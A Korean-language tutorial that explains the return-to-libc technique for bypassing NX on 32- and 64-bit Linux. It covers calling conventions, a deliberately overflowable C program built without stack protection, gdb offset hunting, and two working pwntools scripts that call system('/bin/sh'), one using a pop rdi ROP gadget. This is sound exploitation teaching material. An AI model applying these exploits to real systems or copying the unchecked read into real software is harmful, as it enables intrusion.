> 출처 : https://www.lazenca.net/pages/viewpage.action?pageId=16810038

# Return to libc(RTL)

- RTL이란 Return address 영역에 공유 라이브러리 함수의 주소로 변경해, 해당 함수를 호출하는 방식이다. 
- 해당 기법을 이용하여 NX bit(DEP)를 우회 할 수 있다.



## RTL - x86

#### Calling Convention(호출 규약)

- 해당 호출 규약은 인텔 x86 기반 시스템의 C/C++ 에서 많이 사용된다.
- 기본적으로 Linux kernal에서는 Cdecl 호출 규약을 사용한다.

|   인자 전달 방법   | Stack을 이용                                        |
| :----------------: | --------------------------------------------------- |
| **인자 정달 순서** | **오른쪽에서 왼쪽의 순서로 스택에 쌓임**            |
| **함수의 반환 값** | **EAX**                                             |
|   **Stack 정리**   | **호출한 함수가 호출된 함수의 stack 공간을 정리함** |

- 다음 코드는 4개의 파라미터를 전달 받고, 반환 값은 ret 변수에 저장한다.

  ```c
  //Calling convention example (C language)
  int a, b, c, d;
  int ret;
  
  ret = function(a, b, c, d);
  ```

- 앞의 코드를 cdecl 형태의 assembly code로 변환하면 다음과 같다.

  ```
  //Calling convention example (Assembly code)
  
  push	d
  push	c
  push	b
  push	a
  call	function
  mov 	ret, eax
  ```

  -> 4개의 인자 값을 push 명령어를 이용해 stack에 저장한다. 함수 호출 후 반환된 값은 EAX 레지스터에 저장되며, 해당 값을  ret 변수에 저장한다.

- Example

  -> cdecl 함수 호출 규약을 확인하기 위해 다음과 같은 코드를 사용한다.

  ```c
  //test.c
  //gcc -m32 -o test test.c
  #include <stdlib.h>
  #include <stdio.h>
   
  void vuln(int a,int b,int c,int d){
          printf("%d, %d, %d, %d",a,b,c,d);
  }
   
  void main(){
          vuln(1,2,3,4);
  }
  ```

  

  // Save argument

  ![image](https://user-images.githubusercontent.com/59410565/117239412-ac460080-ae69-11eb-94d2-4e13ef0d6799.png)

  -> gdb를 이용하여 cdecl 함수 호출 규약 형태를 확인할 수 있다.

  

  // Arguments stored in the Stack

  ![image](https://user-images.githubusercontent.com/59410565/117240924-dcdb6980-ae6c-11eb-8b67-864b96b90752.png)

  -> main() 함수에서 vuln 함수의 인자 값을 push 명령어를 이용하여 Stack에 저장한다. vuln() 함수의 인자가 전달되는 **0x08048449**에 bp를 걸어 stack에저장된 파라미터 값을 확인할 수 있다.

  

  // Load argument

  ![image](https://user-images.githubusercontent.com/59410565/117240101-101cf900-ae6b-11eb-80a0-be48b4bba58f.png)

  **[push ebp] :** main() 함수에서 사용하던 호출 프레임이 Stack에 저장하고, 이전 함수에서 사용하던 호출 프레임은 ebp 레지스터에 저장되어 있다. 

  **[mov ebp, esp] :** vuln() 함수에서 사용할 새 호출 프레임이 ebp 레지스터에 초기화 된다. ebp 헤지스터를 활용하여 main() 함수로부터 전달된 파라미터 값을 활용할 수 있다.

  **[DWORD PTR [ebp+*]] :** 전달된 파라미터의 값을 확인할 수 있다.

  

  //New call frame

  |  Address   |   Value    |        Explanation         |
  | :--------: | :--------: | :------------------------: |
  | 0xffffd578 | 0xffffd598 | 이전 호출 프레임(psuh ebp) |
  | 0xffffd57c | 0x0804844e |       Return address       |
  | 0xffffd580 |    0x1     |           Arg 1            |
  | 0xffffd584 |    0x2     |           Arg 2            |
  | 0xffffd588 |    0x3     |           Arg 3            |
  | 0xffffd58c |    0x4     |           Arg 4            |

  -> stack에서 확인해보기

  ![image](https://user-images.githubusercontent.com/59410565/117241183-80c51500-ae6d-11eb-8bbf-0be7b5bd6da1.png)

  ![image](https://user-images.githubusercontent.com/59410565/117241382-03e66b00-ae6e-11eb-8e78-0fa79cbf6b78.png)

  즉, 다음과 같이 ret2libc 기법 사용시 파라미터 값을 전달하기 위해서는 Return Address의 4byte 뒤에 인자 값을 전달해야 한다

------



#### Proof of concept

- Return to Shellcode를 확인하기 위햏 다음 코드를 사용한다.

  ```c
  #define _GNU_SOURCE
  #include <stdio.h>
  #include <unistd.h>
  #include <dlfcn.h>
   
  void vuln(){
      char buf[50] = "";
      void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
      printf("Printf() address : %p\n",printf_addr);
      read(0, buf, 100);
  }
   
  void main(){
      vuln();
  }
  ```

  -> read() 함수에서 stack overflow 발생. 아래와 같이 빌드하고 살펴보자.

  ```c
  gcc -fno-stack-protector -o ret2libc ret2libc.c -ldl -m32
  ```

------



#### Overwriting the return address

![image](https://user-images.githubusercontent.com/59410565/117252771-639a4180-ae81-11eb-9bf6-2d9da1cadfcd.png)

**[Break Point]**

- vuln + 0 : vuln() 함수의 첫 번째 명령어
- vuln + 107 : read() 함수 호출
- vuln + 122 : vuln() 함수의 RET 명령어

![image](https://user-images.githubusercontent.com/59410565/117536000-b87db980-b033-11eb-80de-766b4ffa085c.png)

- esp 레지스터가 가리키고 있는 최상위 stack 주소는 0xffffd01c이다. 이 영역에 Return address(0x080485ac)가 저장되어 있다.

![image](https://user-images.githubusercontent.com/59410565/117536055-f11d9300-b033-11eb-8acd-c2ac01f519f3.png)

![image](https://user-images.githubusercontent.com/59410565/117536074-009cdc00-b034-11eb-93c7-ccaadca6fc06.png)

- buf 변수의 위치는 0xffffcfda이고, Return address와 66byte 떨어져 있다. 즉, 문자를 66개 이상 입력하면, Return Address를 덮어쓸 수 있다.

![image](https://user-images.githubusercontent.com/59410565/117536120-422d8700-b034-11eb-93f7-a20b08790155.png)

- 0xffffd01c 영역의 값이 바뀌었다.

------



#### Find the Libc address of the system() function and "/bin/sh"

```c
int system(const char *command)
```

- system() 함수는 파라미터 값으로 실행할 command의 경로를 문자열로 전달받고 있다. 즉, RTL 기법을 사용하여 shell을 실행하기 위해 "/bin/sh" 문자열을 전달해야 한다.

![image](https://user-images.githubusercontent.com/59410565/117536146-64bfa000-b034-11eb-8fca-1af27e22148d.png)

![image](https://user-images.githubusercontent.com/59410565/117536167-8587f580-b034-11eb-88d8-9b0ca32db0dd.png)

- 0xf7e47680(printf function address in libc) - 0xf7dfe000(libc Start Address) = 0x300672(libc Base Address offset)
- 0xf7e38db0(system function address in libc) - 0xf7dfe000(libc Start Address) = 0x3adb0(system function Address offset)
- 0xf7f59b0b("/bin/sh" string address in libc) - 0xf7dfe000(libc Start Address) = 0x15bb0b("/bin/sh" string Address offset)

![image](https://user-images.githubusercontent.com/59410565/117536198-a2242d80-b034-11eb-9134-6e0024c21c43.png)

> find "/bin/sh"가 search "/bin/sh" 였음.

------



#### Exploit

```python
from pwn import *
 
p = process('./ret2libc')
 
p.recvuntil('Printf() address : ')
stackAddr = p.recvuntil('\n')
stackAddr = int(stackAddr,16)
 
libcBase = stackAddr - 0x49680
sysAddr = libcBase + 0x3adb0
binsh = libcBase + 0x15bb0b
 
print hex(libcBase)
print hex(sysAddr)
print hex(binsh)
 
exploit = "A" * (70 - len(p32(sysAddr)))
exploit += p32(sysAddr)
exploit += 'BBBB'
exploit += p32(binsh)
 
p.send(exploit)
p.interactive()
```

이와 같은 코드를 이용해 shell을 획득할 수 있다. 그러나 error가 발생한다.

![image](https://user-images.githubusercontent.com/59410565/117536246-ee6f6d80-b034-11eb-8c42-5beffce6e23b.png)

- system() 함수 호출 후에 0x42424242 영역으로 이동하려고 했기 때문에 error가 발생한다. 즉, 0x42424242 영역에 system() 함수 호출 후 이동 할 영역의 주소를 저장하면 error가 발생하지 않는다.

![image](https://user-images.githubusercontent.com/59410565/117536273-1232b380-b035-11eb-8fc3-810b60ba6c3b.png)

------



## RTL - x64

#### Calling Convention

|   인자 전달 방법   | RDI, RSI, RDX, RCX, R8, R9, XM0-7                   |
| :----------------: | --------------------------------------------------- |
| **인자 전달 순서** | **오른쪽에서 왼쪽의 순서로 레지스터에 저장된다.**   |
| **함수의 반환 값** | **EAX**                                             |
|   **stack 정리**   | **호출한 함수가 호출된 함수의 stack 공간을 정리함** |

- 다음 코드는 4개의 인자를 전달 받고, 반환값은 ret 변수에 저장한다.

  ```c
  //Calling convention example (C language)
  int a, b, c, d;
  int ret;
  
  ret = function(a,b,c,d);
  ```

- 앞에 코드를 cdecl 형태의 assembly code로 변환하면 다음과 같다.

  ```c
  //Calling convention example (Assembly code)
  
  mov 	rcx, d
  mov 	rdx, c
  mov 	rsi, b
  mov 	rdi, a
  call 	function
  mov 	ret, eax
  ```

  -> 4개의 파라미터 값을 mov 명령어를 이용해 레지스터에 저장한다. 함수 호출 후 반환된 값은 EAX 레지스터에 저장되며, 해당 값을 ret 변수에 저장한다.

------



#### Exaample

- "System V AMD64 ABI" 함수 호출 규약을 확인하기 위해 다음과 같은 코드를 사용한다.

  ```c
  //gcc -o test test.c
  #include <stdlib.h>
  #include <stdio.h>
   
  void vuln(int a,int b,int c,int d){
          printf("%d, %d, %d, %d",a,b,c,d);
  }
   
  void main(){
          vuln(1,2,3,4);
  }
  ```

- 다음과 같이 각 레지스터레 저장된 vuln() 함수의 인자 값을 확인할 수 있다.

![image-20210506163851985](C:\Users\hyera\AppData\Roaming\Typora\typora-user-images\image-20210506163851985.png)

![image](https://user-images.githubusercontent.com/59410565/117260047-9e07dc80-ae89-11eb-83a6-c881428f73a6.png)

- 그리고 vuln() 함수는 printf() 함수에 인자를 전달하기 위해 파라미터를 재배치한다.

![image](https://user-images.githubusercontent.com/59410565/117260259-d90a1000-ae89-11eb-9b45-a3842e7944f0.png)

- 다음과 같이 각 레지스터에서 printf() 함수에 전달되는 파라미터 값을 확인할 수 있다.

![image](https://user-images.githubusercontent.com/59410565/117260408-048cfa80-ae8a-11eb-8672-f1cbed0866e1.png)

![image](https://user-images.githubusercontent.com/59410565/117260800-6b121880-ae8a-11eb-8c8a-71bf485a0fb7.png)

- rest2libc 기법을 사용하기 위해서는 각 레지스터에 값을 저장할 수 있어야 한다.
- 즉, 다음과 같은 방법으로 레지스터에 값을 저장할 수 있다.

1. Return Address 영역에 "pop rdi, ret" 코드가 저장된 주소 값을 저장한다.
2. Return Address 다음 영역에 해당 레지스터에 저장 할 파라미터 값을 저장한다.
3. 그 다음 영역에 호출  할 함수의 주소를 저장한다.

- 이러한 방식을 ROP(Return-oriented programming) 라고 한다.

------



#### Proof of concept

// Overwriting the return address

- Return to Shellcode를 확인하기 위해 다음 코드를 사용한다.

  ```
  #define _GNU_SOURCE
  #include <stdio.h>
  #include <unistd.h>
  #include <dlfcn.h>
   
  void vuln(){
      char buf[50] = "";
      void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
      printf("Printf() address : %p\n",printf_addr);
      read(0, buf, 100);
  }
   
  void main(){
      vuln();
  }
  ```

  다음과 같이 빌드한다.

  ```
  gcc -fno-stack-protector -o ret2libc ret2libc.c -ldl
  ```

  ![image](https://user-images.githubusercontent.com/59410565/117282503-ca2e5800-ae9f-11eb-812f-5bff6f7e78a3.png)

**[Break Point]**

- vuln+0 : vuln() 함수의 첫번째 명령어
- vuln+106 : read() 함수 호출
- vuln+113 : vuln() 함수의 RET 명령어

![image](https://user-images.githubusercontent.com/59410565/117536373-a6047f80-b035-11eb-8c16-b31196c1255c.png)

- ESP 레지스터가 가리키고 있는 최상위 stacak의 주소는 0x7fffffffde48이고, 이 영역에 Return address(0x4006f6)이 저장되어 있다.

![image](https://user-images.githubusercontent.com/59410565/117283076-68222280-aea0-11eb-97bf-dfda8aacd898.png)

![image](https://user-images.githubusercontent.com/59410565/117536441-ff6cae80-b035-11eb-95f4-a19def40fd54.png)

- 다음과 같이 buf 변수의 주소를 확인할 수 있다. buf 변수의 위치는 0x7fffffffdd90이고, return address와 72bytes 떨어져있다. 즉, 문자를 72개 이상 입력하면 return address를 덮어쓸 수 있다.

![image](https://user-images.githubusercontent.com/59410565/117536476-29be6c00-b036-11eb-9c63-536cb62855b9.png)

- 다음과 같이 값이 변경된 것을 볼 수 있다.

------



#### Find the Libc address of the system() function and "/bin/sh"

- 다음과 같이 Libc 영역에서 system() 함수의 주소를 찾을 수 있다.

![image](https://user-images.githubusercontent.com/59410565/117536498-4490e080-b036-11eb-8beb-2e4dc5a16406.png)

- 다음과 같이 "/bin/sh" 문자열을 찾을 수 있다.

![image](https://user-images.githubusercontent.com/59410565/117536733-c6cdd480-b037-11eb-8c8f-7ec04288e13a.png)

- 다음과 같이 필요한 코드를 찾을 수 있다.

![image-20210508202204392](https://user-images.githubusercontent.com/59410565/117546163-0dd1bf00-b064-11eb-8b6c-3a44f1de891e.png)

------



#### Exploit

````python
from pwn import *
  
p = process('./ret2libc')
  
p.recvuntil('Printf() address : ')
stackAddr = p.recvuntil('\n')
stackAddr = int(stackAddr,16)
  
libcBase = stackAddr - 0x55810
sysAddr = libcBase + 0x453a0
binsh = libcBase + 0x18ce17
poprdi = 0x400763
  
print hex(libcBase)
print hex(sysAddr)
print hex(binsh)
print hex(poprdi)
  
exploit = "A" * (80 - len(p64(sysAddr)))
exploit += p64(poprdi)
exploit += p64(binsh)
exploit += p64(sysAddr)
 
p.send(exploit)
p.interactive()
````



![image](https://user-images.githubusercontent.com/59410565/117537408-9daf4300-b03b-11eb-808d-e21a6001ea09.png)

